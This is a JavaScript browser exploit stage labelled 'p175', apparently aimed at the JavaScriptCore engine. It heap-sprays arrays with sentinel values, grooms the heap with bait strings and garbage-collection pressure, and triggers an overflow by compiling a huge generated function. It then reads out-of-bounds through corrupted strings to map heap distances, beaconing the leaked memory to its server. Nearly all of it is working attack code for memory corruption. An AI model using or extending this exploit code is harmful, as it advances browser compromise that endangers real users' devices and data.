// p175 — Heap Spray Sentinel Correlation
//
// GOAL: Map the heap layout around the corruption zone by placing known
// sentinel values in arrays BEFORE the overflow, then scanning OOB to
// find them. This tells us the exact heap distance from our corrupted
// strings to our controlled array backing stores (butterflies).
//
// STRATEGY:
//   1. BEFORE overflow: allocate 50 arrays, each with 7 elements
//      array[0] = 0xDEAD0000 + i (sentinel per array)
//      These go into ContiguousDouble butterfly storage (8 bytes/element)
//      Butterfly size: 8 header + 7*8 = 64 bytes each
//   2. Run p146 bait-and-switch overflow
//   3. Use OOB charCodeAt to scan for sentinel IEEE 754 byte patterns
//      All sentinels 0xDEAD0000-0xDEAD0031 share upper bytes in LE:
//      offset+4: 0xA0, offset+5: 0xD5, offset+6: 0xEB, offset+7: 0x41
//   4. For each found: record byte offset from string start, decode
//      which array index (sentinel i)
//   5. This maps heap distance from strings to controlled butterflies
//
// ENCODING NOTE: 0xDEAD0000 (3,735,879,680) exceeds int32 range, so JSC
// uses ContiguousDouble storage. We precompute expected byte patterns
// using DataView for reliable matching.
//
// Beacon prefix: V175-

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V175-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  }
  function BP(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V175-' + tag + '?t=' + Date.now(), true);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body);
    } catch(e) {}
  }

  B('BOOT');

  // ── PHASE 0: SENTINEL ARRAYS (before anything else) ──
  // Allocate 50 arrays with sentinel values so their butterflies are in the heap
  var N_SENTINELS = 50;
  var SENTINEL_BASE = 0xDEAD0000;
  var sentinelArrays = [];

  B('SENTINEL-START');
  for (var i = 0; i < N_SENTINELS; i++) {
    var arr = new Array(7);
    arr[0] = SENTINEL_BASE + i;
    // Fill remaining slots with distinguishable values
    arr[1] = SENTINEL_BASE + i + 0x100;
    arr[2] = SENTINEL_BASE + i + 0x200;
    arr[3] = SENTINEL_BASE + i + 0x300;
    arr[4] = SENTINEL_BASE + i + 0x400;
    arr[5] = SENTINEL_BASE + i + 0x500;
    arr[6] = SENTINEL_BASE + i + 0x600;
    sentinelArrays.push(arr);
  }
  B('SENTINEL-DONE-' + sentinelArrays.length);

  // Precompute sentinel byte signatures using DataView
  // All sentinels share upper 4 bytes in little-endian IEEE 754
  // We store the full 8-byte pattern for each sentinel's arr[0] value
  var sigBuf = new ArrayBuffer(8);
  var sigDV = new DataView(sigBuf);
  var sigU8 = new Uint8Array(sigBuf);

  // Compute the shared signature bytes (bytes 4-7 in LE are the same for all)
  sigDV.setFloat64(0, SENTINEL_BASE, true); // little-endian
  var sigByte4 = sigU8[4]; // 0xA0
  var sigByte5 = sigU8[5]; // 0xD5
  var sigByte6 = sigU8[6]; // 0xEB
  var sigByte7 = sigU8[7]; // 0x41

  B('SIG-' + sigByte4.toString(16) + '-' + sigByte5.toString(16) +
    '-' + sigByte6.toString(16) + '-' + sigByte7.toString(16));

  // Build lookup: for each sentinel i, store bytes 0-3 (the varying part)
  var sentinelLowBytes = [];
  for (var i = 0; i < N_SENTINELS; i++) {
    sigDV.setFloat64(0, SENTINEL_BASE + i, true);
    sentinelLowBytes.push([sigU8[0], sigU8[1], sigU8[2], sigU8[3]]);
  }

  // ── WORKER ──
  var workerCode = function() {
    var targets = [];
    var baseUrl = '';
    var STR_LEN = 100000;
    var CANARY = 0x41; // 'A'

    // These get filled in via message from main thread
    var sigBytes = null;    // [byte4, byte5, byte6, byte7] shared upper bytes
    var lowBytes = null;    // array of [b0,b1,b2,b3] per sentinel

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V175-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }
    function beaconPost(tag, body) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V175-W-' + tag + '?t=' + Date.now(), true);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(body);
      } catch(e) {}
    }
    function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    // Read N bytes as raw hex
    function readRawHex(str, off, n) {
      var hex = '';
      for (var i = 0; i < n; i++) {
        try {
          var v = str.charCodeAt(off + i);
          if (v !== v) { hex += 'XX'; break; }
          hex += hx(v);
        } catch(e) { hex += 'XX'; break; }
      }
      return hex;
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'sigs') {
        // Receive precomputed sentinel byte signatures from main thread
        sigBytes = e.data.sigBytes;
        lowBytes = e.data.lowBytes;
        beacon('SIGS-' + lowBytes.length);
        return;
      }
      if (e.data.cmd === 'alloc') {
        // Exact p156 pattern: 14 strings of 100K 'A' chars
        var chunk = '';
        for (var k = 0; k < 100; k++) chunk += 'AAAAAAAAAA'; // 1000 chars
        for (var i = 0; i < 14; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) s += chunk;
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0); // force materialization
          targets.push(s);
        }
        beacon('TARGETS-' + targets.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCHING');

        // ── DETECT CORRUPTION ──
        var found = false;
        var iters = 0;
        while (!found) {
          for (var i = 0; i < targets.length; i++) {
            if (targets[i].length !== STR_LEN) {
              found = true;
              break;
            }
            try {
              var c8 = targets[i].charCodeAt(8);
              if (c8 !== CANARY) { found = true; break; }
            } catch(e) { found = true; break; }
          }
          iters++;
          if (iters % 500000 === 0) beacon('POLL-' + iters);
        }

        beacon('CORRUPTED-iter=' + iters);

        // ── SCAN FOR SENTINEL BYTE PATTERNS ──
        var totalFound = 0;
        var results = []; // {stringIdx, offset, sentinelIdx}

        for (var i = 0; i < targets.length; i++) {
          var len;
          try { len = targets[i].length; } catch(e) { beacon('ERR-' + i); continue; }

          if (len === STR_LEN) {
            // Check if actually corrupted
            try {
              if (targets[i].charCodeAt(8) === CANARY &&
                  targets[i].charCodeAt(24) === CANARY) continue;
            } catch(e) { continue; }
          }

          beacon('S' + i + '-len=' + len);

          // Determine scan range
          // Scan all available bytes: 0 to min(len, scan_limit)
          // For OOB (len > STR_LEN): scan extended region
          // For within-bounds: scan what we have
          var scanLimit;
          if (len > STR_LEN) {
            // OOB available! Scan up to 16KB past original buffer
            scanLimit = Math.min(len, STR_LEN + 16384);
            beacon('OOB-' + i + '-extra=' + (len - STR_LEN));
          } else if (len > 0) {
            scanLimit = Math.min(len, STR_LEN);
          } else {
            continue;
          }

          // Scan for the 4-byte shared signature at positions aligned to 8 bytes
          // In little-endian IEEE 754 for our sentinel range:
          // bytes +4,+5,+6,+7 of the double are the shared upper bytes
          // So we scan at every byte offset where we might find the signature
          // The double starts at the butterfly element boundary (8-byte aligned)
          // but we don't know the alignment relative to our string, so scan every byte

          for (var off = 0; off + 8 <= scanLimit; off++) {
            try {
              // Quick check: byte at off+7 must be sigBytes[3] (0x41)
              // But 0x41 is also our canary 'A', so check off+6 first (more selective)
              var b6 = targets[i].charCodeAt(off + 6);
              if (b6 !== sigBytes[2]) continue; // sigBytes[2] = 0xEB

              var b7 = targets[i].charCodeAt(off + 7);
              if (b7 !== sigBytes[3]) continue; // 0x41

              var b4 = targets[i].charCodeAt(off + 4);
              if (b4 !== sigBytes[0]) continue; // 0xA0

              var b5 = targets[i].charCodeAt(off + 5);
              if (b5 !== sigBytes[1]) continue; // 0xD5

              // All 4 upper bytes match! Read the lower 4 bytes to identify which sentinel
              var lb0 = targets[i].charCodeAt(off);
              var lb1 = targets[i].charCodeAt(off + 1);
              var lb2 = targets[i].charCodeAt(off + 2);
              var lb3 = targets[i].charCodeAt(off + 3);

              // Match against known sentinels
              var matched = -1;
              for (var s = 0; s < lowBytes.length; s++) {
                if (lb0 === lowBytes[s][0] && lb1 === lowBytes[s][1] &&
                    lb2 === lowBytes[s][2] && lb3 === lowBytes[s][3]) {
                  matched = s;
                  break;
                }
              }

              if (matched >= 0) {
                results.push({ str: i, off: off, sentinel: matched });
                beacon('FOUND-s' + i + '-off=' + off + '-sentinel=' + matched);
                totalFound++;
              } else {
                // Signature match but not a known sentinel — could be nearby value
                beacon('PARTIALMATCH-s' + i + '-off=' + off +
                       '-lo=' + hx(lb0) + hx(lb1) + hx(lb2) + hx(lb3));
              }

              // Dump surrounding 32 bytes for context
              var ctx = readRawHex(targets[i], Math.max(0, off - 8), Math.min(48, scanLimit - Math.max(0, off - 8)));
              beacon('CTX-s' + i + '-off=' + off + '-' + ctx);

              if (totalFound >= 100) break; // limit beacon flood
            } catch(e) {
              // Hit unmapped memory or similar
              beacon('SCANERR-' + i + '-off=' + off);
              break;
            }
          }
          if (totalFound >= 100) break;

          // Also scan within-bounds for non-canary data (metadata entry bytes)
          if (len <= STR_LEN) {
            var firstNonCanary = -1;
            var scanBound = Math.min(len, 2000);
            for (var b = 0; b < scanBound; b++) {
              try {
                if (targets[i].charCodeAt(b) !== CANARY) {
                  firstNonCanary = b;
                  break;
                }
              } catch(e) { break; }
            }
            if (firstNonCanary >= 0) {
              beacon('NC-' + i + '-off=' + firstNonCanary);
              // Dump metadata entry bytes
              var entryHex = readRawHex(targets[i], firstNonCanary, Math.min(112, scanBound - firstNonCanary));
              beaconPost('ENTRY-' + i, entryHex);
            }
          }
        }

        // ── SUMMARY ──
        beacon('TOTAL-SENTINELS=' + totalFound);
        if (results.length > 0) {
          // Build a compact map: sentinel_index -> [offsets]
          var map = '';
          for (var r = 0; r < results.length; r++) {
            map += 'arr' + results[r].sentinel + '@str' + results[r].str + '+' + results[r].off + ' ';
          }
          beaconPost('MAP', map);

          // Compute heap distances
          for (var r = 0; r < results.length; r++) {
            var heapDist = results[r].off - STR_LEN;
            beacon('DIST-arr' + results[r].sentinel + '=' + heapDist + 'B');
          }
        }
        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // Send precomputed signatures to worker
  worker.postMessage({
    cmd: 'sigs',
    sigBytes: [sigByte4, sigByte5, sigByte6, sigByte7],
    lowBytes: sentinelLowBytes
  });

  // ── PHASE 1: BAIT STRINGS (exact p156 pattern) ──
  var N_BAIT = 20;
  var STR_LEN = 100000;
  B('BAIT-START');
  var baits = [];
  var baitChunk = '';
  for (var k = 0; k < 100; k++) baitChunk += 'BBBBBBBBBB'; // 1000 B chars
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) bait += baitChunk;
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0); // force materialization
    baits.push(bait);
  }
  baitChunk = null;
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: WORKER ALLOCATES TARGETS ──
  worker.onmessage = function(e) {
    if (e.data.ready) phaseFreeBaits();
  };
  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc', count: 14 });

  // ── PHASE 3: FREE BAITS + GC PRESSURE ──
  function phaseFreeBaits() {
    B('FREE-START');
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;

    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) setTimeout(gcPressureRound, 30);
      else { B('GC-DONE-' + gcRound); phaseBuild(); }
    }
    gcPressureRound();
  }

  // ── PHASE 4: BUILD + CALL OVERFLOW ──
  function phaseBuild() {
    B('BUILD-START');
    var N = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N / CHUNK);
    var REM = N - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v175fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v175ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v175ok ? 'OK' : 'FAIL'));
      if (!window.__v175fn) { B('NO-FN'); return; }

      // Start worker polling, then trigger overflow
      worker.postMessage({ cmd: 'watch' });

      setTimeout(function() {
        B('CALLING');
        try {
          window.__v175fn(function(){});
        } catch(ex) {
          B('CATCH-' + (ex.message || '').substring(0, 30));
        }
        B('SURVIVED');
      }, 200);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
